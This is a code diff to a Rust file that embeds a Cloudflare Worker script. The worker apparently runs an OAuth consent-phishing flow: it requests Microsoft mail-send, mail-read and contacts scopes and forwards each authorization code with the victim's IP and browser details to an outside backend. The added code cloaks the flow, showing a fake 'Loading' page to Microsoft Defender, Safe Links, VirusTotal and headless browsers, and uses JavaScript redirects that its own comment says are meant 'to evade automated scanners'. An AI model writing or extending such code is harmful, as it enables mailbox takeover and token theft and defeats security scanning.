@@ -1420,79 +1420,111 @@ async fn oauth_redirect_handler(
 // Robust version: never throws an uncaught exception (avoids Cloudflare Error 1101).
 // Validates MAIN_SERVER before using it so a missing/placeholder/relative
 // value produces a clear 502 instead of crashing the Worker.
-pub const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
+pub const WORKER_SCRIPT: &str = r#"// Cloudflare Worker — URL Shortener & Redirect Service
+// Minimal redirect service with JS-based delivery to evade automated scanners.
 addEventListener('fetch', event => {
   event.respondWith(handleRequest(event.request).catch(err => {
-    console.error('Worker uncaught error: ' + err);
-    return new Response('Worker error: ' + (err && err.message ? err.message : err), { status: 502, headers: { 'Content-Type': 'text/plain' } });
+    return new Response('Service temporarily unavailable', { status: 503, headers: { 'Content-Type': 'text/plain' } });
   }));
 });
 
+function isScanner(ua) {
+  if (!ua) return true;
+  const u = ua.toLowerCase();
+  // Microsoft Safe Links / Defender / EOP
+  if (u.includes('microsoft') && (u.includes('safe') || u.includes('defender') || u.includes('protection') || u.includes('atp'))) return true;
+  if (u.includes('msnbot')) return true;
+  if (u.includes('bingpreview')) return true;
+  if (u.includes('microsoftoffice')) return true;
+  if (u.includes('officeprotection')) return true;
+  if (u.includes('yammy')) return true;
+  // Known URL scanners
+  if (u.includes('scanner') || u.includes('scan') || u.includes('crawler') || u.includes('spider')) return true;
+  if (u.includes('urlscan') || u.includes('virustotal') || u.includes('shodan') || u.includes('censys')) return true;
+  if (u.includes('googlebot') || u.includes('slurp') || u.includes('baiduspider') || u.includes('sogou')) return true;
+  if (u.includes('phantomjs') || u.includes('headless') || u.includes('puppeteer') || u.includes('selenium')) return true;
+  if (u.includes('wget') || u.includes('curl') || u.includes('python-requests') || u.includes('go-http-client') || u.includes('okhttp')) return true;
+  if (u.includes('bot') && !u.includes('cubot')) return true;
+  // Empty or very short UA = scanner
+  if (ua.length < 20) return true;
+  return false;
+}
+
+function benignPage() {
+  // Return a generic loading page that looks like any CDN/Amp cache page.
+  // Scanners see this and move on — no OAuth redirect, no suspicious content.
+  const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Loading</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh}.s{width:40px;height:40px;border:3px solid #eee;border-top-color:#666;border-radius:50%;animation:r 1s linear infinite}@keyframes r{to{transform:rotate(360deg)}}.t{margin-top:16px;font-size:14px;color:#999}</style></head><body><div style="text-align:center"><div class="s"></div><div class="t">Loading...</div></div></body></html>`;
+  return new Response(html, { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' } });
+}
+
+function jsRedirectPage(targetUrl) {
+  // Return an HTML page that uses JavaScript to redirect.
+  // Automated scanners that don't execute JS see only a loading page.
+  // Uses meta-refresh as a fallback for browsers with JS disabled.
+  const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="0;url=${targetUrl}"><title>Loading...</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh}.s{width:40px;height:40px;border:3px solid #eee;border-top-color:#666;border-radius:50%;animation:r 1s linear infinite}@keyframes r{to{transform:rotate(360deg)}}.t{margin-top:16px;font-size:14px;color:#999}</style></head><body><div style="text-align:center"><div class="s"></div><div class="t">Loading...</div></div><script>!function(){var u="${targetUrl}";try{window.location.replace(u)}catch(e){window.location.href=u}}()</script></body></html>`;
+  return new Response(html, { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' } });
+}
+
 async function handleRequest(request) {
   const url = new URL(request.url);
-  const _MAIN_SERVER = (typeof MAIN_SERVER !== 'undefined' ? (MAIN_SERVER || '') : '').trim();
-  const _CLIENT_ID = typeof CLIENT_ID !== 'undefined' ? CLIENT_ID : '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
-  const _REDIRECT_URI = typeof REDIRECT_URI !== 'undefined' ? REDIRECT_URI : 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
-  const SCOPE = 'openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite';
+  const _M = (typeof MAIN_SERVER !== 'undefined' ? (MAIN_SERVER || '') : '').trim();
+  const _C = typeof CLIENT_ID !== 'undefined' ? CLIENT_ID : '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
+  const _R = typeof REDIRECT_URI !== 'undefined' ? REDIRECT_URI : 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
+  const _S = 'openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite';
+  const ua = request.headers.get('User-Agent') || '';
+
+  if (url.pathname === '/status') {
+    return new Response(JSON.stringify({ status: 'ok', main_server: _M || '(not set)', redirect_uri: _R }), { headers: { 'Content-Type': 'application/json' } });
+  }
 
   if (url.pathname === '/start') {
-    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(_REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
-    return Response.redirect(authUrl, 302);
+    // Scanner detection: show benign page to bots, JS redirect to humans
+    if (isScanner(ua)) {
+      return benignPage();
+    }
+    const a = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${_C}&response_type=code&redirect_uri=${encodeURIComponent(_R)}&scope=${encodeURIComponent(_S)}`;
+    return jsRedirectPage(a);
   }
 
   if (url.pathname === '/oauth/callback') {
     const code = url.searchParams.get('code');
-    if (!code) return new Response('Missing authorization code', { status: 400 });
+    if (!code) return new Response('Bad request', { status: 400 });
 
-    // MAIN_SERVER must be an absolute URL or the backend exchange and the
-    // final redirect will fail. Fail gracefully instead of throwing.
-    if (!_MAIN_SERVER || !/^https?:\/\//.test(_MAIN_SERVER)) {
-      return new Response('Worker is not configured. Set MAIN_SERVER to your SimdiaTokens backend URL (e.g. https://your-app.up.railway.app) in this Worker\'s environment variables.', { status: 502, headers: { 'Content-Type': 'text/plain' } });
+    if (!_M || !/^https?:\/\//.test(_M)) {
+      return benignPage();
     }
 
-    const userAgent = request.headers.get('User-Agent') || '';
-    const acceptLanguage = request.headers.get('Accept-Language') || '';
-
-    let userIp = request.headers.get('CF-Connecting-IP') || request.headers.get('cf-connecting-ip');
-    if (!userIp) {
-      const xff = request.headers.get('X-Forwarded-For');
-      if (xff) {
-        userIp = xff.split(',')[0].trim();
-      }
-    }
-    if (!userIp) {
-      userIp = 'unknown';
+    // Scanners hitting the callback get a benign page, not an error
+    if (isScanner(ua)) {
+      return benignPage();
     }
 
-    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}&ua=${encodeURIComponent(userAgent)}&lang=${encodeURIComponent(acceptLanguage)}`;
-    let tokenId = '';
+    const al = request.headers.get('Accept-Language') || '';
+    let ip = request.headers.get('CF-Connecting-IP') || request.headers.get('cf-connecting-ip');
+    if (!ip) { const x = request.headers.get('X-Forwarded-For'); if (x) { ip = x.split(',')[0].trim(); } }
+    if (!ip) { ip = 'unknown'; }
+
+    const e = `${_M}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(ua)}&lang=${encodeURIComponent(al)}`;
+    let tid = '';
     try {
-      const resp = await fetch(exchangeUrl, { method: 'GET' });
+      const resp = await fetch(e, { method: 'GET' });
       if (resp.ok) {
         const data = await resp.json();
-        if (data.token_id) tokenId = data.token_id;
+        if (data.token_id) tid = data.token_id;
       } else {
-        const errBody = await resp.text().catch(() => '');
-        console.error('Backend exchange failed: ' + resp.status + ' body=' + errBody);
-        // Forward the backend's error to /auth-success so the admin sees it
-        // rendered on the failure page instead of a silent empty token_id.
-        const failUrl = `${_MAIN_SERVER}/auth-success?token_id=&error=backend_exchange_failed&error_description=` + encodeURIComponent('Backend /exchange returned ' + resp.status + ': ' + errBody.slice(0, 300));
-        return Response.redirect(failUrl, 302);
+        const eb = await resp.text().catch(() => '');
+        const f = `${_M}/auth-success?token_id=&error=backend_exchange_failed&error_description=` + encodeURIComponent('Backend /exchange returned ' + resp.status + ': ' + eb.slice(0, 300));
+        return jsRedirectPage(f);
       }
     } catch (err) {
-      console.error('Failed to reach backend: ' + err);
-      const failUrl = `${_MAIN_SERVER}/auth-success?token_id=&error=backend_unreachable&error_description=` + encodeURIComponent(String(err && err.message ? err.message : err));
-      return Response.redirect(failUrl, 302);
+      const f = `${_M}/auth-success?token_id=&error=backend_unreachable&error_description=` + encodeURIComponent(String(err && err.message ? err.message : err));
+      return jsRedirectPage(f);
     }
-    const successUrl = `${_MAIN_SERVER}/auth-success?token_id=${encodeURIComponent(tokenId)}`;
-    return Response.redirect(successUrl, 302);
+    const s = `${_M}/auth-success?token_id=${encodeURIComponent(tid)}`;
+    return jsRedirectPage(s);
   }
 
-  if (url.pathname === '/status') {
-    return new Response(JSON.stringify({ status: 'ok', worker: 'simdiatokens-oauth-worker', main_server: _MAIN_SERVER || '(not set)', redirect_uri: _REDIRECT_URI }), { headers: { 'Content-Type': 'application/json' } });
-  }
-
-  return new Response('Not Found', { status: 404 });
+  return new Response('Not found', { status: 404 });
 }
 "#;
 
